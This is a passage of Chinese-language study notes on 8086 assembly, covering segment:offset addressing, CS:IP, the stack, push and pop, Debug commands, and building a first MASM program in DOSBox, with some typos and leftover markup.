位结构的含相同)<strong>描述了一个CPU具有下面几方面的结构特性。</strong><br><strong>1.运算器一次最多可以处理 16位的数据</strong><br><strong>2.寄存器的最大宽度为16位;</strong><br><strong>3.寄存器和运算器之间的通路为 16位</strong><br>8086 是 16 位结构的 CPU，</strong>这也就是说，在 8086 内部，能够一次性处理、传输、暂时存储的信息的最大长度是 16 位的。</strong>内存单元的地址在送上地址总线之前，必须在 CPU中处理、传输、暂时存放，<strong>对于 16位 CPU，能一次性处理、传输、暂时存储 16位的地址</strong>。</p><h4 id="8086cpu给出物理地址的方法"><a href="#8086cpu给出物理地址的方法" class="headerlink" title="8086cpu给出物理地址的方法"></a><strong>8086cpu给出物理地址的方法</strong></h4><p>8086CPU有20位地址总线，可以传送20位地址，达到1MB寻址能力。8086CPU又是16位结构，在内部一次性处理、传输、暂时存储的地址为 16 位。<br>8086CPU采用一种在内部用两个 16位地址合成的方法来形成一个20位的物理地址8086CPU相关部件的逻辑结构如图2.6所示。</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121202629121.png" alt="image-20231121202629121"></p><p>当8086CPU要读写内存时:<br>1.CPU中的相关部件提供<strong>两个16位的地址</strong>，一个称为<strong>段地址</strong>，另一个称为<strong>偏移地址:</strong></p><p>2.<strong>段地址和偏移地址</strong>通过<strong>内部总线</strong>送入一个称为<strong>地址加法器</strong>的部件;</p><p>3.<strong>地址加法器将两个16位地址</strong>合成为<strong>一个20位的物理地址;</strong></p><p>4**.地址加法器<strong>通过</strong>内部总线<strong>将 <strong>20位物理地址</strong>送入</strong>输入输出控制电路**;</p><p>5.<strong>输入输出控制电路</strong>将 <strong>20位物理地址</strong>送上<strong>地址总线</strong>:</p><p>6.<strong>20位物理地址被地址总线传送到存储器。</strong></p><p>地址加法器采用<strong>物理地址&#x3D;段地址X16+偏移地址</strong>的方法用段地址和偏移地址合成物理地址。例如，8086CPU 要访问地址为 123C8H 的内存单元，此时，地址加法器的工作过程如图 2.7 所示。</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231123201756825.png" alt="image-20231123201756825"></p><p><strong>&#x3D;&#x3D;一个数据的十六进制形式左移1位，相当于乘以16:一个数据的十进形式左移1位，相当于乘以10;一个X进制的数据左移1位，相当于乘以X。&#x3D;&#x3D;</strong></p><h4 id="“段地址X16-偏移地址-物理地址”的本质含义"><a href="#“段地址X16-偏移地址-物理地址”的本质含义" class="headerlink" title="“段地址X16+偏移地址&#x3D;物理地址”的本质含义"></a>“段地址X16+偏移地址&#x3D;物理地址”的本质含义</h4><p><strong>“段地址x16+偏移地址&#x3D;物理地址”</strong>的本质含义是:CPU 在访问内存时，用一个**&#x3D;&#x3D;基础地址&#x3D;&#x3D;(段地址X16)<strong>和一个</strong><u>相对于</u>基础地址的&#x3D;&#x3D;偏移地址&#x3D;&#x3D;<strong>相加，</strong>给出内存单元的物理地址<strong>。<br>更一般地说，8086CPU的这种寻址功能是&#x3D;&#x3D;</strong><u>“基础地址+偏移地址&#x3D;物理地址”</u><strong>&#x3D;&#x3D;（</strong>这就是本质，请牢记它**）寻址模式的一种具体实现方案。8086CPU 中，段地址x16 可看作是基础地址。</p><h4 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h4><p>其实，内存并没有分段，段的划分来自于 CPU，由于 8086CPU 用“基础地址(段地址X16)+偏移地址&#x3D;物理地址”的方式给出内存单元的物理地址，使得我们可以用分段的方式来管理内存。</p><p>以后，在编程时可以根据需要，将若干地址连续的内存单元看作一个段，用段地址X16 定位段的起始地址(基础地址)，用偏移地址定位段中的内存单元。<strong>有两点需要注意:&#x3D;&#x3D;段地址X16 必然是 16 的倍数，所以一个段的起始地址也一定是 16 的倍数&#x3D;&#x3D;: &#x3D;&#x3D;偏移地址为16位，16位地址的寻址能力为 64KB，所以一个段的长度最大为 64KB&#x3D;&#x3D;</strong></p><h4 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h4><p>什么部件提供段地址。段地址在 8086CPU 的段寄存器中存放。8086CPU 有 <strong>4 个段存器:CS、DS、SS、ES</strong>。当8086CPU 要访问内存时由这4个段寄存器提供内存单元的段地址。</p><h4 id="CS和IP"><a href="#CS和IP" class="headerlink" title="CS和IP"></a>CS和IP</h4><p><strong>CS和IP</strong>是8086CPU中两个最关键的存器，它们指示了CPU 当前要读取指令的地址。<strong>CS 为代码段寄存器，IP为指令指针寄存器</strong>。<br>在8086PC 机中，任意时刻，<strong>设 CS 中的内容为M</strong>，<strong>IP 中的内容为N</strong>，8086CPU 将<strong>从内存Mx16+N单元开始</strong>，读取一条指令并执行。<br>也可以这样表述:8086机中，任意时刻，CPU将CS:IP 指向的内容当作指令执行图2.10展示了8086CPU 读取、执行指令的工作原理（图中只包括了和所要说明的问题<br>密切相关的部件，图中数字都为十六进制)。（没写完，未完待续）</p><p><strong>&#x3D;&#x3D;8086CPU 的工作过程可以简要描述如下&#x3D;&#x3D;</strong><br>&#x3D;&#x3D;<strong>1.从 CS:IP 指向的内存单元读取指令，读取的指令进入指令缓冲器</strong>&#x3D;&#x3D;</p><p>&#x3D;&#x3D;<strong>2.IP&#x3D;IP+所读取指令的长度，从而指向下一条指令;</strong>&#x3D;&#x3D;</p><p>&#x3D;&#x3D;<strong>3.执行指令。转到步骤(1)，重复这个过程。</strong>&#x3D;&#x3D;<br>在 8086CPU加电启动或复位后(即 CPU 刚开始工作时)CS 和IP被设置为CS&#x3D;FFFFH，IP&#x3D;0000H，即在 8086PC 机刚启动时，CPU 从内存 FFFF0H 单元中读取指执行，FFFF0H单元中的指令是8086PC机开机后执行的第一条指令。</p><h4 id="修改CS、IP的指令"><a href="#修改CS、IP的指令" class="headerlink" title="&#x3D;&#x3D;修改CS、IP的指令&#x3D;&#x3D;"></a>&#x3D;&#x3D;修改CS、IP的指令&#x3D;&#x3D;</h4><p>mov 指令&#x3D;&#x3D;<strong>不能</strong>&#x3D;&#x3D;用于设置 CS、IP 的值</p><p>&#x3D;&#x3D;<strong>jmp 指令</strong>&#x3D;&#x3D;<strong>可以修改CS、IP 的指令</strong></p><p><strong>&#x3D;&#x3D;jmp语法：“jmp 段地址:偏地址”&#x3D;&#x3D;</strong>jmp 2AE3:3，执行后:CS&#x3D;2AE3H，IP&#x3D;0003H，CPU将从2AE33H 处读取指令</p><p>​<strong>&#x3D;&#x3D;jmp ax，在含义上好似:mov IP,ax&#x3D;&#x3D;</strong></p><h4 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h4><p>前面讲过，对于 8086PC 机，在编程时，可以根据需要，将一组内存单元定义为一个段。我们可以将长度为 N(N≤64KB)的一组代码，存在一组地址连续、起始地址为 16 的倍数的内存单元中，我们可以认为，<strong>这段内存是用来存放代码的，从而定义了一个代码段</strong></p><h4 id="查看cpu和内存，用机器指令和汇编指令编程（dosbox）"><a href="#查看cpu和内存，用机器指令和汇编指令编程（dosbox）" class="headerlink" title="&#x3D;&#x3D;查看cpu和内存，用机器指令和汇编指令编程（dosbox）&#x3D;&#x3D;"></a>&#x3D;&#x3D;查看cpu和内存，用机器指令和汇编指令编程（dosbox）&#x3D;&#x3D;</h4><p>&#x3D;&#x3D;R命令:查看、修改CPU中寄存器的内容&#x3D;&#x3D;<br>&#x3D;&#x3D;D命令:查看内存中的内容&#x3D;&#x3D;<br>&#x3D;&#x3D;E命令:修改内存中的内容(可以写入数据、指令，在内存中，它们实际上没有区别)&#x3D;&#x3D;</p><p>&#x3D;&#x3D;U命令:将内存中的内容解释为机器指令和对应的汇编指令&#x3D;&#x3D;</p><p>&#x3D;&#x3D;T命令:执行CSIP指向的内存单元处的指令&#x3D;&#x3D;</p><p>&#x3D;&#x3D;A命令:以汇编指令的形式向内存中写入指令&#x3D;&#x3D;</p><h2 id="第三章-寄存器-内存访问"><a href="#第三章-寄存器-内存访问" class="headerlink" title="第三章 寄存器(内存访问)"></a>第三章 寄存器(内存访问)</h2><h4 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h4><p><strong>字单元</strong>：即存放一个字型数据**(16 位)<strong>的内存单元，</strong>由两个地址连续的内存单元组成<strong>。</strong>高地址内存单元<strong>中</strong>存放<strong>字型数据的</strong>高位字节<strong>，</strong>低地址内存单元<strong>中</strong>存放<strong>字型数据的</strong>低位字节**。</p><h4 id="DS-和-address"><a href="#DS-和-address" class="headerlink" title="DS 和[address]"></a>DS 和[address]</h4><p><strong>DS 寄存器</strong>，通常用来存放要访问数据的<strong>段地址</strong>。</p><figure class="highlight plaintext"><figcaption><span>Language</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx，1000H</span><br><span class="line">mov ds,bx </span><br><span class="line">mov al,[0]//[0]表示内存单元的偏移地址</span><br></pre></td></tr></table></figure><p>上面的3条指令将10000H(1000:)中的数据读到al中</p><p><strong>8086CPU</strong> &#x3D;&#x3D;不支持&#x3D;&#x3D;将数据直接送入<strong>段寄存器</strong>的操作，<strong>ds 是一个段寄存器</strong>，所以mov ds，1000H这条指是<strong>非法</strong>的。<strong>只好用一个寄存器来进行中转</strong></p><h4 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h4><p>8086CPU是16 位结构，有 16 根数据线，所以，可以一次性传送 16 位的数据，也就是说可以一次性传送一个字。只要在 mov 指令中给出 16 位的存器就可以进行 16 位数据的传送了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,11316//2c34H</span><br><span class="line">mov [0],ax</span><br><span class="line">mov bx，[0]</span><br><span class="line">sub bx，[2]</span><br><span class="line">mov [2],bx</span><br></pre></td></tr></table></figure><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231128190417961.png" alt="image-20231128190417961"></p><h4 id="mov、add、sub-指令"><a href="#mov、add、sub-指令" class="headerlink" title="&#x3D;&#x3D;mov、add、sub 指令&#x3D;&#x3D;"></a>&#x3D;&#x3D;mov、add、sub 指令&#x3D;&#x3D;</h4><p>前面我们用到了mov、add、sub 指令，它们都带有两个操作对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov ax,8;mov 寄存器，数据</span><br><span class="line">mov ax,bx;mov 寄存器，寄存器</span><br><span class="line">mov ax,[0];mov 寄存器，内存单元</span><br><span class="line">mov [0],ax;mov 内存单元，寄存器</span><br><span class="line">mov ds,ax;mov 段寄存器，寄存器</span><br><span class="line">mov ax,ds;mov 寄存器，段寄存器</span><br><span class="line">mov [0],cs;mov 内存单元，段寄存器</span><br><span class="line">mov cs,[0];mov 段寄存器，内存单元</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add ax,8;add 寄存器，数据</span><br><span class="line">add ax,bx;add 寄存器，寄存器</span><br><span class="line">add ax,[0];add 寄存器，内存单元</span><br><span class="line">add [O],ax;add 内存单元，寄存器</span><br><span class="line">sub ax,9;sub 寄存器，数据</span><br><span class="line">sub ax,bx;sub 寄存器，寄存器</span><br><span class="line">sub ax,[0];sub 寄存器，内存单元</span><br><span class="line">sub [O],ax;sub 内存导昂版臂元，寄存器</span><br></pre></td></tr></table></figure><h4 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h4><p>对于8086PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。<strong>我们可以将一组长度为 N(N&lt;64KB)、地址连续、起始地址为 16的倍数的内存单元当作专门存储数据的内存空间</strong>，从而定义了一个数据段。</p><h4 id="栈"><a href="#栈" class="headerlink" title="&#x3D;&#x3D;栈&#x3D;&#x3D;"></a>&#x3D;&#x3D;栈&#x3D;&#x3D;</h4><p>**&#x3D;&#x3D;栈&#x3D;&#x3D;<strong>是一种具有特殊的访问方式的存储空间。它的特殊性就在于，</strong>&#x3D;&#x3D;最后进入&#x3D;&#x3D;<strong>这个空间的数据，</strong>&#x3D;&#x3D;最先出去&#x3D;&#x3D;**。</p><h4 id="CPU-提供的栈机制"><a href="#CPU-提供的栈机制" class="headerlink" title="&#x3D;&#x3D;CPU 提供的栈机制&#x3D;&#x3D;"></a>&#x3D;&#x3D;CPU 提供的栈机制&#x3D;&#x3D;</h4><p><strong>&#x3D;&#x3D;PUSH&#x3D;&#x3D;(入栈)</strong> push ax 表示将<strong>寄存器 ax 中的数据送入栈中</strong>，</p><p><strong>&#x3D;&#x3D;POP&#x3D;&#x3D;(出栈)</strong>pop ax 表示<strong>从顶取出数据送入 ax</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">push ax</span><br><span class="line">mov bx,2266H</span><br><span class="line">push bx</span><br><span class="line">mov Cx,1122H</span><br><span class="line">push cx</span><br><span class="line">pop ax</span><br><span class="line">pop bx</span><br><span class="line">pop cx</span><br></pre></td></tr></table></figure><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231129193859165.png" alt="image-20231129193859165"></p><p><strong>&#x3D;&#x3D;段寄存器 SS&#x3D;&#x3D;<strong>：栈顶的</strong>段地址</strong>存放在SS中，相关规则与ds相同 mov ss,1000h非法</p><p><strong>&#x3D;&#x3D;寄存器 SP&#x3D;&#x3D;<strong>：栈顶的</strong>偏移地址</strong>存放在SP中。</p><p><strong>&#x3D;&#x3D;任意时刻，SS:SP 指向栈顶元素。&#x3D;&#x3D;</strong></p><p><strong>入栈时，栈顶从&#x3D;&#x3D;高地址向低地址&#x3D;方向增长。</strong></p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231129200014071.png" alt="image-20231129200014071"></p><h4 id="栈顶超界的问题"><a href="#栈顶超界的问题" class="headerlink" title="栈顶超界的问题"></a>栈顶超界的问题</h4><p>push超界</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231130190041473.png" alt="image-20231130190041473"></p><p>pop超界</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231130190145344.png" alt="image-20231130190145344"></p><p>这也就是说，8086CPU <strong>只知道栈顶在何处</strong>(由SS:SP 指示)，而<strong>不知道我们安排的栈空间有多大</strong>。8086CPU 它只考虑当前的情况:当前的栈顶在何处、当前要执行的指令是哪一条。<br>我们在编程的时候要自己操心栈顶超界的问题，要根据可能用到的最大栈空间，来安排栈的大小，防止入栈的数据太多而导致的超界，执行出栈操作的时候也要注意，以防栈空的时候继续出栈而导致的超界。</p><h4 id="push、pop-指令"><a href="#push、pop-指令" class="headerlink" title="push、pop 指令"></a>push、pop 指令</h4><p>push 寄存器将一个寄存器中的数据入栈</p><p>pop 寄存器;出栈 用一个寄存器接收出栈的数据</p><p>push 段寄存器将一个段寄存器中的数据入栈</p><p>pop 段寄存器  出栈，用一个段寄存器接收出栈的数据</p><p>push 内存单元将一个内存字单元处的字入栈（注意:栈操作都是以字为单位）</p><p>pop 内存单元  出栈，用一个内存字单元接收出栈的数据</p><h4 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h4><p>对于8086PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。<strong>我们可以将长度为 N(N64KB)的一组地址连续、起始地址为 16的倍数的内存单元，当作栈空间来用，&#x3D;&#x3D;从而定义了一个栈段&#x3D;&#x3D;。</strong>比如，我们将10010H~1001FH这段长度为 16 字节的内存空间当作栈来用，以栈的方式进行访问。这段空间就可以称为一个栈段，段地址为 1001H，大小为 16 字节。</p><h2 id="第四章：第一个程序"><a href="#第四章：第一个程序" class="headerlink" title="第四章：第一个程序"></a>第四章：第一个程序</h2><h4 id="一个源程序从写出到执行的过程"><a href="#一个源程序从写出到执行的过程" class="headerlink" title="一个源程序从写出到执行的过程-"></a>一个源程序从写出到执行的过程-</h4><p><strong>第一步:编写汇编源程序</strong><br>使用文本编辑器(如 Edit、记事本等)，用汇编语言编写汇编源程序。<br>这一步工作的结果是产生了一个存储源程序的文本文件。<br><strong>第二步:对源程序进行编译连接。</strong><br>使用汇编语言编译程序对源程序文件中的源程序进行编译，产生目标文件;再用连接程序对目标文件进行连接，生成可在操作系统中直接运行的可执行文件。<br>可执行文件包含<strong>两部分内容</strong><br>1.<strong>程序</strong>(从源程序中的汇编指令翻译过来的机器码)<strong>和数据</strong>(源程序中定义的<br>2.<strong>相关的描述信息</strong>(比如，程序有多大、要占用多少内存空间等)<br><strong>结果</strong>:产生了一个可在操作系统中运行的可执行文件。<br><strong>第三步:执行可执行文件中的程序</strong></p><p>在操作系统中，执行可执行文件中的程序<br>操作系统依照可执行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化(比如设置 CS:IP 指向第一条要执行的指)，然后由 CPU 执行程序。</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231217183643810.png" alt="image-20231217183643810"></p><h4 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment//codesg是段名</span><br><span class="line">mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,ax</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>在汇编语言<strong>源程序</strong>中，包含两种指令，一种是&#x3D;&#x3D;<strong>汇编指令</strong>&#x3D;&#x3D;，一种是**&#x3D;&#x3D;伪指令&#x3D;&#x3D;**</p><p>**&#x3D;&#x3D;汇编指令&#x3D;&#x3D;<strong>是有对应的机器码的指令，</strong>可以被编译为机器指令,最终为 &#x3D;&#x3D;CPU 所执行&#x3D;&#x3D;**。</p><p><strong>&#x3D;&#x3D;伪指令&#x3D;&#x3D;<strong>没有对应的机器指令，最终</strong>不被 CPU 所执行</strong>，伪指令<strong>是由&#x3D;&#x3D;编译器&#x3D;&#x3D;来执行的指令</strong>，编译器根据伪指令来进行相关的编译工作。</p><h6 id="1-伪指令"><a href="#1-伪指令" class="headerlink" title="&#x3D;&#x3D;1.伪指令&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;1.伪指令&#x3D;&#x3D;</strong></h6><p>1.<strong>segment和ends</strong>是一对<strong>成对</strong>使用的伪指令，这是在写可被编译器编译的汇编程序时<strong>必须要用到的一对伪指令</strong>。segment 和ends的<strong>功能是&#x3D;&#x3D;定义一个段&#x3D;&#x3D;<strong>。</strong>segment 说明一个段开始</strong>，<strong>ends 说明一个段结束</strong>。一个段必须有一个名称来标识，使用格式为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">段名 segment</span><br><span class="line">:</span><br><span class="line">段名 ends</span><br></pre></td></tr></table></figure><p>2.<strong>end</strong> 是一个<strong>汇编程序的&#x3D;&#x3D;结束标记&#x3D;&#x3D;<strong>，编译器在编译汇编程序的过程中，如果碰到了伪指令 end，就结束对源程序的编译。所以，在我们写程序的时候，</strong>如果程序写完了，要在结尾处加上伪指令end</strong>。<strong>否则，编译器在编译程序时，无法知道程序在何处结束。</strong><br>&#x3D;&#x3D;<strong>注意，不要搞混了end和ends</strong>&#x3D;&#x3D;，<strong>ends 是和segment 成对使用的</strong>，<strong>标记一个段的结束ends的含义可理解为“end segment”</strong>。我们这里讲的<strong>end 的作用是标记整个程序的结束。</strong></p><p>3.assume<br>这条伪指令的含义为<strong>“假设”</strong>。<strong>它假设某一段寄存器和程序中的某一个用segment…ends 定义的段相关联</strong>。<strong>通过 assume 说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系</strong>。assume 并不是一条非要深入理解不可的伪指令，以后我们编程时，记着<strong>用 assume 将有特定用途的段和相关的段寄存器关联起来即可。</strong><br>比如，在程序4.1中，我们用 codesg segment … codesg ends 定义了一个名为 <strong>codseg的段</strong>，在<strong>这个段中存放代码</strong>，所以<strong>这个段是一个代码段</strong>。在程序的开头，<strong>用 &#x3D;&#x3D;assume cs:codesg&#x3D;&#x3D;将用作代码段的段 &#x3D;&#x3D;codesg 和CPU中的段存器cs 联系起来&#x3D;&#x3D;。</strong></p><h6 id="2-源代码中的程序"><a href="#2-源代码中的程序" class="headerlink" title="&#x3D;&#x3D;2.源代码中的程序&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;2.源代码中的程序&#x3D;&#x3D;</strong></h6><p><strong>这里所说的程序就是指源程序中最终由计算机执行、处理的指令或数据。</strong><br><strong>&#x3D;&#x3D;注意&#x3D;&#x3D;<strong>，以后可以将</strong>源程序文件中的&#x3D;&#x3D;所有内容称为源程序&#x3D;&#x3D;<strong>，</strong>将源程序中&#x3D;&#x3D;最终由计算机执行、处理的指令或数据，称为程序&#x3D;&#x3D;<strong>。程序</strong>最先以汇编指令的形式存在源程序中，经编译、连接后转变为机器码，存储在可执行文件中。</strong></p><h6 id="3-标号"><a href="#3-标号" class="headerlink" title="&#x3D;&#x3D;3.标号&#x3D;&#x3D;"></a><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231217192918964.png" alt="image-20231217192918964">&#x3D;&#x3D;<strong>3.标号</strong>&#x3D;&#x3D;</h6><p>汇编源程序中，除了汇编指令和伪指令外，还有一些标号，<strong>比如“codesg’个标号指代了一个地址</strong>。<strong>比如 codesg 在 segment 的前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。</strong></p><h6 id="4-程序的结构"><a href="#4-程序的结构" class="headerlink" title="&#x3D;&#x3D;4.程序的结构&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;4.程序的结构&#x3D;&#x3D;</strong></h6><p>我们现在讨论一下汇编程序的结构。在前3章中，我们都是通过直接在 Debug 中写入汇编指令来写汇编程序，对于十分简短的程序这样做的确方便。可对于大一些的程序，就不能如此了。<strong>我们需要写出能让编译器进行编译的源程序，这样的源程序应该具备起码的结构。</strong><br>源程序是由一些段构成的。我们可以在这些段中存放代码、数据、或将某个段当作栈空间。我们现在来一步步地完成一个小程序，从这个过程中体会一下汇编程序中的基本要素和汇编程序的简单框架。</p><p>任务:编程运算23。源程序应该怎样来写呢?<br>(1)我们要定义一个段，名称为 abc。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">:</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><p>(2) 在这个段中写入汇编指令，来实现我们的任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line"> mov ax，2</span><br><span class="line"> add ax,ax</span><br><span class="line"> add ax,ax</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><p>(3)然后，要指出程序在何处结束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line"> mov ax，2</span><br><span class="line"> add ax,ax</span><br><span class="line"> add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>(4) abc 被当作代码段来用，所以，应该将 abc 和 cs 联系起来。(当然，对于这个程序，也不是非这样做不可。)<strong>&#x3D;&#x3D;&#x2F;&#x2F;4.2&#x3D;&#x3D;</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line"> mov ax,2</span><br><span class="line"> add ax,ax</span><br><span class="line"> add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h6 id="5-程序返回"><a href="#5-程序返回" class="headerlink" title="&#x3D;&#x3D;5.程序返回&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;5.程序返回&#x3D;&#x3D;</strong></h6><p>我们的程序最先以汇编指令的形式存在源程序中，经编译、连接后转变为机器码，存储在可执行文件中，那么，它怎样得到运行呢?<br>下面，我们在 DOS(一个单任务操作系统)的基础上，简单地讨论一下这个问题<br>一个程序 P2在可执行文件中，则必须有一个正在运行的程序 P1，将 P2从可执行文件中加载入内存后，将CPU 的控制权交给 P2，P2才能得以运行。P2开始运行后，P1暂停运行。<br>而当P2 运行完毕后，应该将 CPU 的控制权交还给使它得以运行的程序 P1，此后P1继续运行。<br>现在，我们知道，一个程序结束后，将 CPU的控制权交还给使它得以运行的程序，我们称这个过程为:程序返回。那么，如何返回呢?应该在程序的末尾添加返回的程序段。<br>我们回过头来，看一下程序 4.1 中的两条指令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax，4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure><p>这两条指令所实现的功能就是程序返回<br>在目前阶段，我们不必去理解 int 21H 指的含义，和为什么要在这条指令的前面加上指令mov ax,4c00H。我们只要知道，在程序的末尾使用这两条指令就可以实现程序返回。</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231217200812396.png" alt="image-20231217200812396"></p><h6 id="6-语法错误和逻辑错误"><a href="#6-语法错误和逻辑错误" class="headerlink" title="&#x3D;&#x3D;6.语法错误和逻辑错误&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;6.语法错误和逻辑错误&#x3D;&#x3D;</strong></h6><p>可见，程序 4.2在运行时会引发一些问题，因为程序没有返回。当然，这个错误在编译的时候是不能表现出来的，也就是说，程序 4.2 对于编译器来说是正确的程序。<br>般说来，程序在编译时被编译器发现的错误是语法错误，比如将程序 4.2 写成如下这样就会发生语法错误:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aume cs:abc</span><br><span class="line">abc segment</span><br><span class="line"> mov ax，2</span><br><span class="line"> add aX,ax</span><br><span class="line"> add ax,ax</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>显然，程序中有编译器不能识别的aume，而且编译器在编译的过程中也无法知道abc段到何处结束。<br>在源程序编译后，在运行时发生的错误是逻辑错误。语法错误容易发现，也容易解决。而逻辑错误通常不容易被发现。不过，程序 4.2 中的错误却显而易见，我们将它改正过来:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line"></span><br><span class="line"> mov ax,2</span><br><span class="line"> add ax,ax</span><br><span class="line"> add ax,ax</span><br><span class="line"> </span><br><span class="line"> mov ax,4c00H</span><br><span class="line"> int 21H</span><br><span class="line"> </span><br><span class="line">ac ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h4 id="编辑源程序"><a href="#编辑源程序" class="headerlink" title="编辑源程序"></a>编辑源程序</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231218164126311.png" alt="image-20231218164126311"></p><h4 id="编译"><a href="#编译" class="headerlink" title="&#x3D;&#x3D;编译&#x3D;&#x3D;"></a>&#x3D;&#x3D;编译&#x3D;&#x3D;</h4><p>1.dosbox设置虚拟c盘</p><p>2.输入C:\masm</p><p>3.如果已经将d:&#x2F;asm&#x2F;MASM设置为虚拟c盘，要运行其中的.ASM在虚拟化c盘的目录下，我们需要将那个文件夹视为c盘，输入c:1.asm</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227172759096.png" alt="image-20231227172759096"></p><p>4.obj（目标文件）文件的生成</p><p>不输入默认在1.asm的所在文件夹内生成1.obj</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227173105489.png" alt="image-20231227173105489"></p><p>5.列表文件的生成</p><p>不输入输出地址即为不生成</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227173239069.png" 